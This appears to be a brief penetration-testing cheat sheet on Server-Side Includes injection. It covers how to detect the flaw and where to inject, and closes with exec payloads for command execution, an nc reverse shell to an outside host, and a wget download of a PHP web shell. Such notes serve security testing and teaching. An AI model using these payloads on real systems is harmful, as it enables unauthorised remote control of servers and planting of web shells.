# SSI

## Testing for SSI

The Server-Side Includes attack allows the exploitation of a web application by injecting scripts in HTML pages or executing arbitrary codes remotely. It can be exploited through manipulation of SSI in use in the application or force its use through user input fields.

It is possible to detect SSI vulnerabilities in two ways:

* Presence of webpages with .stm, .shtm or .shtml extension
* Submitting a payload containing the following characters `< ! # = / . " - > and [a-zA-Z0-9]`

## Exploitation

The injection point for the payload can be any parameter of a request such as cookies,  headers, url parameters form fields and the name of uploaded files.

```
<!--#exec cmd="<cmd>" -->                        #command execution
<!--#exec cmd="nc -c bash <host> <port>" -->     #reverse shell
<!--#exec cmd="wget http://<path>shell.txt | mv shell.txt shell.php" -->
```



